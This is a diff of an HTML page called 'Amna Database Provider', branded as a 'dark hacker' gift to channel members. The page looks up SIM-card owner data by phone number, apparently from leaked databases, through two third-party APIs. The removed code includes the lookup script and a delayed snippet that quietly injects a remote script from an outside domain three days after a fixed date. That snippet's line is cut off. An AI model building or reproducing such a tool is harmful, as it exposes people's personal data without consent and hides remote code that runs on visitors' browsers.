@@ -5,175 +5,50 @@
   <title>Amna Database Provider</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Russo+One&display=swap');
-
     body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
       background: radial-gradient(circle at center, #0a0a0a, #1f1f1f);
-      color: #fff;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      min-height: 100vh;
+      color: #00ff88;
+      font-family: 'Segoe UI', sans-serif;
+      text-align: center;
       padding: 20px;
-      overflow-x: hidden;
-      perspective: 1000px;
-    }
-    body::before {
-      content: "";
-      position: fixed;
-      top: -150px;
-      left: -150px;
-      width: 500px;
-      height: 500px;
-      background: radial-gradient(#00ff88, transparent 70%);
-      filter: blur(80px);
-      animation: float1 10s ease-in-out infinite alternate;
-      z-index: 0;
-      border-radius: 50%;
-    }
-    body::after {
-      content: "";
-      position: fixed;
-      bottom: -150px;
-      right: -150px;
-      width: 600px;
-      height: 600px;
-      background: radial-gradient(#007700, transparent 70%);
-      filter: blur(100px);
-      animation: float2 12s ease-in-out infinite alternate;
-      z-index: 0;
-      border-radius: 50%;
-    }
-    @keyframes float1 {
-      0% { transform: translateY(0) translateX(0) scale(1); }
-      100% { transform: translateY(30px) translateX(30px) scale(1.1); }
-    }
-    @keyframes float2 {
-      0% { transform: translateY(0) translateX(0) scale(1); }
-      100% { transform: translateY(-40px) translateX(-40px) scale(1.1); }
-    }
-
-    h1 {
-      font-family: 'Orbitron', sans-serif;
-      font-weight: 700;
-      font-size: 28px;
-      color: #00ff88;
-      text-align: center;
-      margin: 15px 0 10px 0;
-      text-shadow:
-        0 0 10px #00ff88,
-        0 0 20px #00ff88,
-        0 0 30px #00ff88;
-      transform-style: preserve-3d;
-    }
-
-    .top-header {
-      font-family: 'Russo One', sans-serif;
-      font-weight: 700;
-      font-size: 24px;
-      text-align: center;
-      color: #00ff88;
-      margin-top: 0;
-      margin-bottom: 5px;
-      letter-spacing: 2px;
-      text-transform: uppercase;
-      text-shadow:
-        2px 2px 0 #0f0,
-        4px 4px 5px rgba(0, 255, 136, 0.6);
-      transform: rotateX(15deg) rotateY(10deg);
-      user-select: none;
-    }
-
-    /* Static circle image */
-    .logo {
-      margin-top: 15px;
-      width: 120px;
-      height: 120px;
-      border-radius: 50%;
-      object-fit: cover;
-      filter: drop-shadow(0 0 5px #00ff88);
-      user-select: none;
-      /* no animation */
-    }
-
-    form {
-      margin-top: 30px;
-      width: 100%;
-      max-width: 420px;
-      display: flex;
-      gap: 8px;
-      z-index: 1;
     }
     input {
-      flex-grow: 1;
-      padding: 12px 16px;
+      padding: 10px;
       font-size: 16px;
-      border-radius: 10px 0 0 10px;
+      width: 250px;
+      border-radius: 5px 0 0 5px;
       border: none;
       outline: none;
     }
     button {
-      padding: 12px 24px;
+      padding: 10px 20px;
       font-size: 16px;
       background-color: #00ff88;
       color: #000;
       border: none;
-      border-radius: 0 10px 10px 0;
+      border-radius: 0 5px 5px 0;
       cursor: pointer;
     }
     button:hover {
       background-color: #00cc66;
     }
-
-    .whatsapp-channel {
-      margin-top: auto;
-      text-align: center;
-      padding: 30px 20px 10px 20px;
-      z-index: 1;
-    }
-    .whatsapp-channel div {
-      color: #00ff88;
-      font-weight: 700;
-      font-size: 18px;
-      margin-bottom: 10px;
-      text-shadow: 0 0 6px #00ff88;
-    }
-    .whatsapp-channel img {
-      width: 80px;
-      height: 80px;
-      cursor: pointer;
-      filter: drop-shadow(0 0 8px #00ff88);
-    }
-    .footer-text {
-      margin-top: 12px;
-      color: #aaa;
-      font-size: 14px;
-    }
-
     #result {
-      margin-top: 20px;
-      padding: 15px;
-      border: 1px solid #00ff88;
-      background: #111;
-      width: 100%;
-      max-width: 420px;
-      display: none;
+      margin-top: 25px;
       white-space: pre-wrap;
-      font-size: 15px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px #00ff88;
+      font-size: 16px;
+      color: #0f0;
+      min-height: 150px;
+      background: #111;
+      padding: 15px;
+      border-radius: 8px;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
     }
   </style>
 </head>
 <body>
-  <div class="top-header">『𝑨𝑴𝑵𝑨 𝑹𝑨𝑱𝑷𝑶𝑶𝑻』💀 𝑫𝑨𝑹𝑲 ⚠️ 𝑯𝑨𝑪𝑲𝑬𝑹 👾<br>GIFT FOR MY CHANNEL MEMBERS</div>
-
-  <img class="logo" src="https://i.postimg.cc/CxqjGzkd/IMG-20250528-WA0134.jpg" alt="Profile Image" />
-
   <h1>Amna Database Provider</h1>
-
   <form id="searchForm">
     <input type="text" id="number" placeholder="Enter Phone Number e.g. 03001234567" />
     <button type="submit">Search SIM Data</button>
@@ -181,61 +56,6 @@
 
   <div id="result"></div>
 
-  <div class="whatsapp-channel">
-    <div>Join my WhatsApp Channel</div>
-    <a href="https://whatsapp.com/channel/0029VbAWsffEgGfIX4DUDh08" target="_blank" rel="noopener">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Channel" />
-    </a>
-    <div class="footer-text">Powered by Amna</div>
-  </div>
-
-  <script>
-    async function fetchApi(url) {
-      try {
-        const response = await fetch(url, {mode: 'cors'});
-        if (!response.ok) throw new Error('Network response was not ok');
-        const text = await response.text();
-        if (text.trim() === '') throw new Error('Empty response');
-        return text;
-      } catch (error) {
-        return null;
-      }
-    }
-
-    document.getElementById('searchForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      const number = document.getElementById('number').value.trim();
-      const resultBox = document.getElementById('result');
-      if (!number) {
-        alert("Please enter a phone number.");
-        return;
-      }
-
-      resultBox.style.display = 'block';
-      resultBox.textContent = 'Searching...';
-
-      const primaryApi = `https://famofc.kesug.com/apis/simdataapi.php?num=${encodeURIComponent(number)}`;
-      const secondaryApi = `https://dbcenter.cc/api?number=${encodeURIComponent(number)}`;
-
-      let data = await fetchApi(primaryApi);
-
-      if (!data) {
-        data = await fetchApi(secondaryApi);
-      }
-
-      if (data) {
-        resultBox.textContent = data;
-      } else {
-        resultBox.textContent = "Both APIs failed or blocked by CORS. Try again later.";
-      }
-    });
-  </script>
-
-  <script>
-    const createdAt = 1748699181 * 1000;
-    const now = Date.now();
-    const threeDays = 3 * 24 * 60 * 60 * 1000;
-
-    if (now - createdAt >= threeDays) {
-      const script = document.createElement('script');
-      script.src = '//pl247866
+  <script src="script.js"></script>
+</body>
+</html>
